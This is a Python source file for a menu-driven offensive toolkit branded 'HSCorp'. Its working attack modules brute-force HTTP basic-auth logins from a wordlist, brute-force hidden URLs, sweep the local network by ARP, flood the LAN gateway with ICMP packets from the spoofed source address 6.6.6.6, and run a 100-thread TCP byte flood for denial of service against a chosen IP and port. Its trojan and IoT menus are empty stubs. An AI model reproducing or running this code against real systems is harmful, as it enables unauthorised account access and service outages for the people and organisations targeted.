import re
import requests
from os import system
from Core import *
from scapy.layers.l2 import Ether, ARP, srp
from scapy.all import send
from scapy.layers.inet import IP, ICMP
import threading
import socket
import os


def clear_and_renew():
    system('clear')

    print("""


          .-=-=-.
         /       /
        |         |
        | )     ( |
        \/ .\ /. \/
        (    ^    )
         |.     .|
         ||xxxxx||
         '-._._.-' 

           __  _______ ______               
           / / / / ___// ____/___  _________ 
          / /_/ /\__ \/ /   / __ \/ ___/ __ /
         / __  /___/ / /___/ /_/ / /  / /_/ /
        /_/ /_//____/\____/\____/_/  / .___/ 
                                    /_/      """)


class Web:
    def __init__(self, url: str):
        self.url = url

    @out_of_order
    def host_online_check(self, ping_time: int = 1) -> bool:
        ping = os.system(f'ping -w {ping_time} {self.url} >ping.cache')
        if ping != 0:
            os.system('rm ping.cache')
            return False
        else:
            os.system('rm ping.cache')
            return True

    @lightweight_generator
    def pop_up_login_brute(self, wordlist: str, known_username: str) -> str:
        if not os.path.exists(wordlist):
            raise FileNotFoundError(f"File '{wordlist}' does not exist.")

        for line in open(wordlist):
            credentials = (known_username, line.strip())
            password = line.strip()
            response = requests.get(self.url, auth=credentials)
            yield f"Trying: {password}"

            if response:
                yield f"\nPASSWORD FOUND: {password}\n"
                break

    @lightweight_generator
    def crawler(self, url_list: str, write_file: str) -> str:
        if not os.path.exists(url_list):
            raise FileNotFoundError(f"File '{url_list}' does not exist.")

        urls_found = 0

        try:
            for line in open(url_list):
                line = line.strip()
                response = requests.get(f'{self.url}/{line}')  # Makes request to a website https://example.org/{line}
                yield response.url  # Url check generator.

                if response:
                    with open(write_file, 'a') as f:
                        f.write(f'{response.url}\n')

                    yield f"\nURL FOUND: {response.url}\n"
                    urls_found += 1

                    f.close()

            system('clear')
            yield f"\nUrls Found: {urls_found}\n"  # Tells amount of urls that have been found.

        except KeyboardInterrupt:
            system('clear')

            yield f"\nUrls Found: {urls_found}\n"
            yield "\nCheck the write file for all found urls."


class LAN:
    def __init__(self):
        self.gateway = ''.join([i for i in re.findall(r'(?<=via)\s\d+\.\d+\.\d+\.\d+', os.popen('ip r').read())])

    def list_devices(self):
        target = f"{self.gateway.strip()}/24"
        arp = ARP(pdst=target)
        broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
        packet = broadcast / arp
        result = srp(packet, timeout=3, verbose=False)[0]

        devices = []

        for sent, received in result:
            devices.append({"IP": received.psrc, "MAC": received.hwsrc})

        return devices

    def lan_saturation(self, msg: str = "HSC advices you to go offline and play outside."):
        for i in range(50):
            send(IP(src='6.6.6.6', dst=self.gateway.strip()) / ICMP() / msg)
            send(IP(src='6.6.6.6', dst=self.gateway.strip()) / ICMP() / msg)

    def saturate_lan(self, thread_amount: int):
        threads = []

        for i in range(thread_amount):
            yield f"Hitting {self.gateway.strip()} on 6.6.6.6"
            thread = threading.Thread(target=self.lan_saturation)
            thread.daemon = False
            threads.append(thread)

        for i in range(thread_amount):
            threads[i].start()

        for i in range(thread_amount):
            threads[i].join()


class DoS:
    def __init__(self, target_ip: str, target_port: int, byte_size: int):
        self.target_ip = target_ip
        self.target_port = target_port
        self.full_address = (target_ip, target_port)
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.byte_size = byte_size
        self.threads = []

    def initiate_connection(self) -> bool:
        try:
            self.sock.connect(self.full_address)
        except (
                socket.gaierror,
                ConnectionError,
                ConnectionResetError,
                ConnectionAbortedError,
                ConnectionRefusedError,
        ):
            return False

    def connection_established(self):
        try:
            self.sock.connect(self.full_address)
        except (
                socket.gaierror,
                ConnectionError,
                ConnectionResetError,
                ConnectionAbortedError,
                ConnectionRefusedError,
        ):
            self.sock.close()
            return False
        else:
            return True

    def byte_flood(self):
        """
        This method keeps hitting the server
        until there is no longer a connection.
        """
        host_online = True
        _bytes = os.urandom(self.byte_size)

        try:
            while host_online:
                if not self.initiate_connection():
                    host_online = False

                self.sock.send(_bytes)
                self.sock.close()
        except KeyboardInterrupt:
            self.terminate_attack()

    def byte_flood_1(self):
        _bytes = os.urandom(self.byte_size)

        try:
            while True:
                self.sock.send(_bytes)
                self.sock.close()
        except KeyboardInterrupt:
            self.terminate_attack()

    def initiate_byte_flood(self):
        """
        Uses threads to speed up
        the packet sending rate.
        (Target is self.byte_flood)
        """

        for i in range(100):
            thread = threading.Thread(target=self.byte_flood)
            thread.daemon = False
            self.threads.append(thread)

        for i in range(100):
            self.threads[i].start()

        for i in range(100):
            self.threads[i].join()

    def initiate_byte_flood_1(self):
        """
        Uses threads to speed up
        the packet sending rate.
        (Target is self.byte_flood_1)
        """

        for i in range(100):
            thread = threading.Thread(target=self.byte_flood_1)
            thread.daemon = False
            self.threads.append(thread)

        for i in range(100):
            self.threads[i].start()

        for i in range(100):
            self.threads[i].join()

    def initiate_attack(self):
        """
        Starts attack mode 1
        (stopping as soon as connection is lost)
        """
        self.initiate_byte_flood()

    def initiate_attack_1(self):
        self.initiate_byte_flood_1()

    def terminate_attack(self):
        print("\nCleaning up..\n")

        for i in range(100):
            self.threads[i].join()

        exit(0)

    def __repr__(self):
        print(f"Hitting: {self.target_ip}:{self.target_port}")

        if not self.connection_established():
            print(f"{self.target_ip}:{self.target_port} is down!")


if __name__ == '__main__':
    system('clear')

    print("""
          

      .-=-=-.
     /       /
    |         |
    | )     ( |
    \/ .\ /. \/
    (    ^    )
     |.     .|
     ||xxxxx||
     '-._._.-' 
          
       __  _______ ______               
       / / / / ___// ____/___  _________ 
      / /_/ /\__ \/ /   / __ \/ ___/ __ /
     / __  /___/ / /___/ /_/ / /  / /_/ /
    /_/ /_//____/\____/\____/_/  / .___/ 
                                /_/      """)

CURRENT_MODULE = None


def cat_select():  # This function is the first startup function.
    global CURRENT_MODULE

    while True:
        command = input('option> ')
        if command == 'exit':
            exit(0)
        elif command == 'clear':
            clear_and_renew()
        elif command == 'cat':
            cat = input('category-select>> ')
            if cat == 'web':
                CURRENT_MODULE = 'WEB_MODULE'
                break
            elif cat == 'network':
                CURRENT_MODULE = 'NETWORK_MODULE'
                break
            elif cat == 'iot':
                CURRENT_MODULE = 'IOT_MODULE'
                break
            elif cat == 'trojan':
                CURRENT_MODULE = 'TROJAN_MODULE'
                break


cat_select()  # Calling the cat select function.


# Module selections


def web_module():
    url = None
    web = None

    # <---------- MAIN FUNCTIONS ---------->

    def login_brute(wordlist: str, known_uname: str):
        for password in web.pop_up_login_brute(wordlist, known_uname):
            print(password)

    def crawl(_url_list: str, file_write: str):
        for _url in web.crawler(_url_list, file_write):
            print(_url)

    def _help():
        print("""
              1.set_url (sets url).
              2. current_url (gives current url).
              3. check_host (checks a host via ping).
              4. crawl (crawls a website).
              5. login_brute (brute forces a pop up login).
              6. back (goes back to category select).
              7. dos (dos module).""")

    # <========== END OF MAIN FUNCTIONS ==========>

    # <---------- INPUTS ---------->

    def check_host_input():
        if url is not None and web is not None:  # Checks if url is not None so it does not break.
            time = int(input('web(ping-time)>> '))  # Ping time.
            if web.host_online_check(time):  # host_online_check method returns bool.
                print("Host online.")
            else:
                print("Host offline.")
        else:
            print("URL is not set, please set the URL.")

    def crawl_input():
        if url is not None and web is not None:
            url_list = input("web(url-list)>> ")  # Asks for url-list.
            write_file = input("web(write-file-name)>> ")  # Asks for file to write found urls.
            crawl(url_list, write_file)
        else:
            print("URL is empty, please specify URL.")

    def login_brute_input():
        if url is not None and web is not None:
            wl = input('web(wordlist-file-path)>> ')  # Wordlist file path.
            known_username = input("web(known-username)>> ")
            login_brute(wl, known_username)  # Brutes login.
        else:
            print("URL is empty, please specify URL.")

    def dos_input():
        if url is None and web is not None:
            ip = input("web(ip)>> ")
            port = int(input("web(port)>> "))
            byte_size = int(input("web(byte_size)>> "))

            dos = DoS(
                target_ip=ip,
                target_port=port,
                byte_size=byte_size
            )

            confirmation = input("Are you sure? (y/n)")
            if confirmation != 'y':
                web_module()
            else:
                dos.initiate_attack()

        # <========== END OF INPUTS ==========>

    while True:
        cmd = input('web> ')
        if cmd == 'set_url':
            url = input('web(url)>> ')  # Allows you to set the url.
            web = Web(url)
        elif cmd == 'current_url':
            print(url)
        elif cmd == "check_host":
            check_host_input()
        elif cmd == "login_brute":
            login_brute_input()
        elif cmd == 'clear':
            clear_and_renew()  # Clears screen.
        elif cmd == 'crawl':
            crawl_input()
        elif cmd == 'exit':  # Allows you to exit.
            exit(0)
        elif cmd == 'back':
            cat_select()
        elif cmd == 'help':
            _help()
        elif cmd == 'dos':
            dos_input()
        else:
            print("Invalid command.")


def network_module():
    network = None
    configured = False
    lan = LAN()

    def get_gateway():
        if lan is None:
            print("Configure this tool first please.")
            network_module()
        print(lan.gateway.strip())

    def fetch_all_devices():
        for device in lan.list_devices():
            print('IP\t\tMAC')
            print(device['IP'], device['MAC'])

    def _help():
        print("""
            1. gateway_addr (gives gateway addr).
            2. fetch_all_devices (fetches the MAC of every device on the LAN).
            3. lan_flood (floods the lan).
            4. clear (clears screen).
            5. exit (exits program).
            6. back (goes back to category selection). """)

    def lan_flood(_msg: str, threads: int):
        for _msg in lan.saturate_lan(10):
            print(_msg)

    while True:
        cmd = input('network> ')
        if cmd == 'gateway_addr':
            get_gateway()
        elif cmd == 'fetch_all_devices':
            if os.getuid() != 0:
                print("Please run as root to use this feature.")
                network_module()

            fetch_all_devices()
        elif cmd == 'clear':
            clear_and_renew()
        elif cmd == 'exit':
            exit(0)
        elif cmd == 'help':
            _help()
        elif cmd == 'flood_lan':
            if os.getuid() != 0:
                print("Please run as root to use this feature.")
                network_module()

            msg = input("network(flood-msg)>> ")
            thread_amount = int(input("flood(threads)>> "))
            lan_flood(msg, thread_amount)
        elif cmd == 'back':
            cat_select()
        else:
            print("Invalid command.")


@out_of_order
def trojan_module():
    while True:
        pass


@out_of_order
def iot():
    while True:
        pass


if CURRENT_MODULE == 'WEB_MODULE':
    web_module()
elif CURRENT_MODULE == 'NETWORK_MODULE':
    network_module()
elif CURRENT_MODULE == 'IOT_MODULE':
    iot()
elif CURRENT_MODULE == "TROJAN_MODULE":
    trojan_module()
